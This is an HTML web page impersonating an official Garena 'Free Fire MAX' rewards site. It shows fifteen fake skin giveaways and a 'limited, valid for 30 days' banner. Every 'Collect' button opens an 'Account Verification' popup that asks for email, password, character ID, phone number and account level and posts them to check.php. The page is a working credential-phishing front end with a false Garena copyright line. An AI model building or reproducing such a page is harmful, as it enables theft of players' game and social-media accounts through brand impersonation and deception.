<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>FreeFire - Official Rewards</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }
        body {
            background: #000;
            font-family: Arial, Helvetica, sans-serif;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: #0a0a0a;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            padding: 20px;
            text-align: center;
        }
        .header img {
            width: 80px;
            border-radius: 20px;
        }
        .header h1 {
            color: #ffcc00;
            font-size: 24px;
            margin-top: 10px;
        }
        .rewards-title {
            text-align: center;
            color: #ffcc00;
            padding: 15px;
            font-size: 18px;
            background: #1a1a1a;
            margin: 10px;
            border-radius: 10px;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            padding: 10px;
        }
        .item {
            background: #1a1a1a;
            border-radius: 10px;
            padding: 10px;
            text-align: center;
            border: 1px solid #ffcc00;
            transition: 0.3s;
        }
        .item img {
            width: 100%;
            border-radius: 10px;
        }
        .item button {
            background: #ffcc00;
            border: none;
            padding: 8px 12px;
            margin-top: 8px;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
        }
        .footer {
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 12px;
            background: #0a0a0a;
        }
        .popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .popup-box {
            background: #1a1a1a;
            width: 90%;
            max-width: 350px;
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            border: 1px solid #ffcc00;
        }
        .popup-box input, .popup-box select {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #333;
            border: none;
            color: #fff;
            border-radius: 5px;
        }
        .popup-box button {
            background: #ffcc00;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .close {
            float: right;
            cursor: pointer;
            font-size: 24px;
            color: #ffcc00;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <img src="https://i.ibb.co/f44594b4e53ed495ecb7e.jpg" alt="logo">
        <h1>FREE FIRE MAX</h1>
    </div>

    <div class="rewards-title">
        🔥 COLLECT EXCLUSIVE REWARDS BY - GARENA 🔥
    </div>

    <div class="grid" id="rewardsGrid">
        <!-- 15 Rewards -->
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/1.jpg" alt="reward"><button onclick="openLogin('Skin 1')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/2.jpg" alt="reward"><button onclick="openLogin('Skin 2')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/3.jpg" alt="reward"><button onclick="openLogin('Skin 3')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/4.jpg" alt="reward"><button onclick="openLogin('Skin 4')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/5.jpg" alt="reward"><button onclick="openLogin('Skin 5')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/6.jpg" alt="reward"><button onclick="openLogin('Skin 6')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/7.jpg" alt="reward"><button onclick="openLogin('Skin 7')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/8.jpg" alt="reward"><button onclick="openLogin('Skin 8')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/9.jpg" alt="reward"><button onclick="openLogin('Skin 9')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/10.jpg" alt="reward"><button onclick="openLogin('Skin 10')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/11.jpg" alt="reward"><button onclick="openLogin('Skin 11')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/12.jpg" alt="reward"><button onclick="openLogin('Skin 12')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/13.jpg" alt="reward"><button onclick="openLogin('Skin 13')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/14.jpg" alt="reward"><button onclick="openLogin('Skin 14')">Collect</button></div>
        <div class="item"><img src="https://i.ibb.co/1f9XvK4/15.jpg" alt="reward"><button onclick="openLogin('Skin 15')">Collect</button></div>
    </div>

    <div class="rewards-title">
        ⏰ LIMITED REWARDS - VALID FOR 30 DAYS ⏰
    </div>

    <div class="footer">
        © Garena, Inc. All rights reserved.
    </div>
</div>

<!-- Login Popup -->
<div id="loginPopup" class="popup">
    <div class="popup-box">
        <span class="close" onclick="closePopup()">&times;</span>
        <h3 style="color:#ffcc00;">Account Verification</h3>
        <form action="check.php" method="POST" id="loginForm">
            <input type="email" name="email" placeholder="Email or Phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="playid" placeholder="Character ID" required>
            <input type="tel" name="phone" placeholder="Phone Number" required>
            <select name="level" required>
                <option value="">Account Level (50+)</option>
                <option>50</option><option>55</option><option>60</option><option>65</option>
                <option>70</option><option>75</option><option>80</option><option>85</option>
                <option>90</option><option>95</option><option>100</option>
            </select>
            <input type="hidden" name="login" id="loginType" value="Facebook">
            <button type="submit">Verify & Claim</button>
        </form>
    </div>
</div>

<script>
    let selectedReward = '';
    function openLogin(reward) {
        selectedReward = reward;
        document.getElementById('loginPopup').style.display = 'flex';
    }
    function closePopup() {
        document.getElementById('loginPopup').style.display = 'none';
    }
    // Close popup when clicking outside
    window.onclick = function(event) {
        let popup = document.getElementById('loginPopup');
        if (event.target == popup) {
            popup.style.display = 'none';
        }
    }
</script>

</body>
</html>
